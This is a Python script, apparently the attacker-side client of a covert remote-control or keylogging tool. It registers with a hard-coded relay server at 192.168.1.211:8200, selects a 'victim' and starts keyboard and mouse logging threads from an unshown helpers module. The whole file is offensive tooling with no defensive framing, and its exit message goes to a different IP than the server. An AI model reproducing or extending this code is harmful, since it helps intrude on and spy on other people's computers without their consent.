import socket
import time
import threading
import functions
from functions import *


def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    F.s = client
    client.sendto("attacker".encode(), ("192.168.1.211", 8200))
    client.recvfrom(1024)[0].decode()
    ip_of_victim = ''
    msg = 'change'
    while msg != "exit":
        if msg == 'change':
            # if F.flag:
            #     client.sendto('u are free'.encode(), ip_of_victim)
            F.flag = False
            choice = int(input('choose')) - 1
            client.sendto(f"choice{choice}".encode(), ("192.168.1.211", 8200))
            client.recvfrom(1024)[0].decode()
            c, ip_of_victim = client.recvfrom(1024)
            F.ip = ip_of_victim
            F.flag = True
            threading.Thread(target=log_keyboard, daemon=True).start()
            threading.Thread(target=log_mouse, daemon=True).start()
            msg = input("exit or change")

    client.sendto("attacker exit".encode(), ("192.168.1.240", 8200))
    client.close()


if __name__ == '__main__':
    main()
